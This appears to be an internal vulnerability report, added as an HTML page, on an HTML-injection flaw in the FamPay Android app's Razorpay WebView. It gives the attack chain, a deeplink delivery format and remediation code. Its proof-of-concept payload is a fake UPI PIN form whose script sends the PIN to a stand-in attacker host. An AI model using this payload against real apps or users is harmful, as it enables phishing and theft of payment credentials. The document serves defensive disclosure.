@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Chain E Report — HTML Injection Phishing | FamPay Security</title>
+<style>
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{background:#0a0a0f;color:#e0e0e0;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;padding:24px 16px;max-width:760px;margin:0 auto;font-size:13px;line-height:1.7}
+  h1{font-size:22px;font-weight:900;color:#fff;margin-bottom:4px}
+  h2{font-size:14px;font-weight:700;color:#d50000;margin:28px 0 10px;letter-spacing:0.3px;text-transform:uppercase}
+  h3{font-size:12px;font-weight:700;color:#aaa;margin:16px 0 6px;text-transform:uppercase;letter-spacing:0.3px}
+  p{color:#bbb;margin-bottom:10px}
+  .badge{display:inline-block;font-size:10px;background:#1a0000;border:1px solid #d50000;color:#d50000;padding:3px 12px;border-radius:20px;letter-spacing:1px;margin-bottom:12px}
+  .severity-bar{display:flex;align-items:center;gap:12px;background:#13131a;border:1px solid #2a2a3a;border-radius:8px;padding:16px 20px;margin-bottom:20px;flex-wrap:wrap}
+  .sev-label{font-size:11px;color:#666;text-transform:uppercase;letter-spacing:0.5px}
+  .sev-high{font-size:28px;font-weight:900;color:#d50000}
+  .divider{width:1px;height:40px;background:#2a2a3a}
+  .meta-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:20px}
+  .meta-card{background:#13131a;border:1px solid #2a2a3a;border-radius:8px;padding:14px}
+  .meta-card .mk{font-size:10px;color:#555;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:4px}
+  .meta-card .mv{font-size:12px;color:#e0e0e0;font-family:monospace;word-break:break-all}
+  code{background:#1a1a2a;border:1px solid #2a2a3a;padding:2px 6px;border-radius:3px;font-family:monospace;font-size:11px;color:#00e676}
+  pre{background:#0d0d14;border:1px solid #2a2a3a;border-radius:6px;padding:14px;overflow-x:auto;font-size:11px;color:#00e676;line-height:1.6;margin:10px 0}
+  .attack-chain{background:#13131a;border:1px solid #2a2a3a;border-radius:8px;padding:16px;margin:10px 0}
+  .chain-step{display:flex;gap:12px;align-items:flex-start;padding:8px 0;border-bottom:1px solid #1a1a2a}
+  .chain-step:last-child{border:none}
+  .step-num{background:#d50000;color:#fff;font-size:10px;font-weight:900;padding:2px 7px;border-radius:10px;min-width:24px;text-align:center;margin-top:1px}
+  .step-body .step-title{font-size:12px;color:#fff;font-weight:700;margin-bottom:2px}
+  .step-body .step-desc{font-size:11px;color:#888}
+  .fix-card{background:#0d1a0d;border:1px solid #1a3a1a;border-radius:8px;padding:14px;margin:8px 0}
+  .fix-card h4{font-size:11px;color:#00e676;margin-bottom:8px;text-transform:uppercase;letter-spacing:0.3px}
+  .tag{display:inline-block;font-size:9px;background:#1a1a2a;border:1px solid #2a2a3a;color:#448aff;padding:1px 6px;border-radius:3px;margin-right:4px}
+  .back-links{display:flex;gap:16px;font-size:11px;margin-top:28px;flex-wrap:wrap}
+  .back-links a{color:#448aff;text-decoration:none}
+  .highlight{background:#1a0000;border-left:3px solid #d50000;padding:10px 14px;border-radius:0 6px 6px 0;margin:10px 0;font-size:12px;color:#ff8888}
+  .impact-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:20px}
+  .impact-card{background:#13131a;border:1px solid #2a2a3a;border-radius:8px;padding:12px}
+  .impact-card .ic-label{font-size:10px;color:#d50000;text-transform:uppercase;margin-bottom:4px}
+  .impact-card .ic-val{font-size:12px;color:#e0e0e0}
+</style>
+</head>
+<body>
+
+<span class="badge">INTERNAL SECURITY REPORT — CHAIN E</span>
+<h1>HTML Injection — In-App Phishing via Razorpay WebView</h1>
+<p style="color:#666;font-size:11px;margin-bottom:20px">FamPay Android v4.0.5.7 · Oversecured Finding #11 + #2 · March 2026</p>
+
+<div class="severity-bar">
+  <div><div class="sev-label">Severity</div><div class="sev-high">CRITICAL</div></div>
+  <div class="divider"></div>
+  <div><div class="sev-label">CVSS Score</div><div class="sev-score" style="font-size:22px;font-weight:700;color:#d50000">9.6</div></div>
+  <div class="divider"></div>
+  <div><div class="sev-label">Vector</div><div class="sev-score">AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N</div></div>
+</div>
+
+<div class="meta-grid">
+  <div class="meta-card"><div class="mk">Vulnerable Method</div><div class="mv">loadDataWithBaseURL("https://api.razorpay.com", …)</div></div>
+  <div class="meta-card"><div class="mk">Injection Point</div><div class="mk">Attacker-controlled HTML loaded with Razorpay origin</div></div>
+  <div class="meta-card"><div class="mk">Bypass Achieved</div><div class="mv">Page shows as "api.razorpay.com" in WebView</div></div>
+  <div class="meta-card"><div class="mk">Combined With</div><div class="mv">Vuln #2 deeplink delivery + Vuln #16 JS interfaces</div></div>
+</div>
+
+<h2>Executive Summary (Non-Technical)</h2>
+<p>FamPay uses Razorpay for payment processing. There is a flaw in how FamPay loads the Razorpay checkout screen: it uses a method called <code>loadDataWithBaseURL</code> that sets the page's "origin" to <code>api.razorpay.com</code> — even when the actual HTML content is controlled by an attacker.</p>
+
+<div class="highlight">This is like printing a fake bank statement on official letterhead. The paper (origin/URL) looks real because it says "api.razorpay.com", but the content — including the "Enter your UPI PIN" form — is entirely controlled by the attacker. The user has no way to tell the difference.</div>
+
+<p>When chained with the deeplink delivery vulnerability (Chain A), an attacker can trick any FamPay user into seeing a convincing payment confirmation screen that steals their UPI PIN, card number, or OTP.</p>
+
+<h2>Impact</h2>
+<div class="impact-grid">
+  <div class="impact-card"><div class="ic-label">UPI PIN Theft</div><div class="ic-val">Fake payment screen captures 4 or 6-digit UPI PIN — enables unauthorized transfers</div></div>
+  <div class="impact-card"><div class="ic-label">Card Credential Theft</div><div class="ic-val">Fake checkout form captures card number, CVV, expiry</div></div>
+  <div class="impact-card"><div class="ic-label">OTP Interception</div><div class="ic-val">Attacker controls the "Enter OTP" form, captures 2FA codes in real time</div></div>
+  <div class="impact-card"><div class="ic-label">Zero Suspicion</div><div class="ic-val">Rendered inside the official FamPay app with Razorpay branding — passes visual inspection</div></div>
+</div>
+
+<h2>Vulnerable Code</h2>
+<h3>BaseRazorpay.java (Lines 1532–1536)</h3>
+<pre>// strReplace contains attacker-influenced content
+webView.loadDataWithBaseURL(
+    "https://api.razorpay.com",   // ← sets origin to trusted Razorpay domain
+    strReplace,                    // ← HTML content (attacker-controlled)
+    "text/html",
+    "UTF-8",
+    null
+);</pre>
+<p>The <code>strReplace</code> variable includes data from the original Intent/deeplink parameters. If an attacker can influence those parameters (via Vuln #2 deeplink delivery), they control the HTML rendered with <code>https://api.razorpay.com</code> as the trusted base URL.</p>
+
+<h2>Attack Chain</h2>
+<div class="attack-chain">
+  <div class="chain-step">
+    <div class="step-num">1</div>
+    <div class="step-body">
+      <div class="step-title">Craft malicious deeplink with injected HTML payload</div>
+      <div class="step-desc">Encode a fake UPI PIN form as the checkout HTML. Deliver via <code>fp://fampay.in/home_init/?init_deeplink=&lt;b64&gt;</code></div>
+    </div>
+  </div>
+  <div class="chain-step">
+    <div class="step-num">2</div>
+    <div class="step-body">
+      <div class="step-title">FamPay opens WebView with attacker HTML</div>
+      <div class="step-desc">loadDataWithBaseURL sets origin to <code>https://api.razorpay.com</code>. User sees official Razorpay branding.</div>
+    </div>
+  </div>
+  <div class="chain-step">
+    <div class="step-num">3</div>
+    <div class="step-body">
+      <div class="step-title">Victim enters UPI PIN / card details</div>
+      <div class="step-desc">Looks like a normal payment confirmation flow inside the trusted FamPay app</div>
+    </div>
+  </div>
+  <div class="chain-step">
+    <div class="step-num">4</div>
+    <div class="step-body">
+      <div class="step-title">Credentials sent to attacker's server</div>
+      <div class="step-desc">JS in the injected page calls <code>fetch()</code> or <code>new Image().src</code> to exfiltrate captured data</div>
+    </div>
+  </div>
+  <div class="chain-step">
+    <div class="step-num">5</div>
+    <div class="step-body">
+      <div class="step-title">Victim shown fake success screen</div>
+      <div class="step-desc">Attacker displays "Payment Successful" — victim doesn't realize they were phished</div>
+    </div>
+  </div>
+</div>
+
+<h2>Proof of Concept Payload</h2>
+<pre>&lt;!-- Injected HTML (loads with origin: https://api.razorpay.com) --&gt;
+&lt;form onsubmit="steal(event)"&gt;
+  &lt;h2&gt;Confirm Payment — ₹2,499&lt;/h2&gt;
+  &lt;input type="password" id="pin" placeholder="Enter UPI PIN" /&gt;
+  &lt;button type="submit"&gt;Pay Now&lt;/button&gt;
+&lt;/form&gt;
+&lt;script&gt;
+function steal(e) {
+  e.preventDefault();
+  new Image().src = 'https://attacker.com/log?tag=upi_pin&data=' + document.getElementById('pin').value;
+}
+&lt;/script&gt;</pre>
+
+<h2>Remediation</h2>
+<div class="fix-card">
+  <h4>Fix 1 — Never use loadDataWithBaseURL with user/deeplink-influenced content</h4>
+  <pre>// BAD: user-controlled HTML with trusted origin
+webView.loadDataWithBaseURL("https://api.razorpay.com", userContent, ...);
+
+// GOOD: load from the actual Razorpay URL
+webView.loadUrl("https://api.razorpay.com/checkout/embedded");
+
+// Or: use loadData() without a base URL (origin = null/about:blank)
+webView.loadData(encodedHtml, "text/html", "UTF-8");</pre>
+</div>
+<div class="fix-card">
+  <h4>Fix 2 — Sanitize all deeplink parameters before rendering</h4>
+  <pre>// Allowlist approach: only permit known-safe checkout parameters
+String checkoutData = intent.getStringExtra("checkout_data");
+if (checkoutData != null && isValidCheckoutJson(checkoutData)) {
+    // Only pass to Razorpay SDK, never inject into raw HTML
+    razorpay.open(parseCheckoutOptions(checkoutData));
+}</pre>
+</div>
+<div class="fix-card">
+  <h4>Fix 3 — Update / replace Razorpay SDK</h4>
+  <p>Contact Razorpay to confirm if a patched SDK version is available that does not use <code>loadDataWithBaseURL</code> with injectable content. Pin the SDK version and monitor for security patches.</p>
+</div>
+
+<h2>References</h2>
+<p><span class="tag">CWE-79</span> Cross-site Scripting (HTML Injection variant)</p>
+<p><span class="tag">CWE-1021</span> Improper Restriction of Rendered UI Layers</p>
+<p><span class="tag">Oversecured</span> Finding #11 — HTML Injection in Razorpay WebView</p>
+<p><span class="tag">Android</span> WebView.loadDataWithBaseURL security considerations</p>
+
+<div class="back-links">
+  <a href="/chain-e-trigger">&#9889; Trigger PoC</a>
+  <a href="/chain-e-exploit">&#127919; Exploit Page</a>
+  <a href="/log-viewer">&#128225; Log Viewer</a>
+  <a href="/">&#8592; All Chains</a>
+</div>
+
+</body>
+</html>
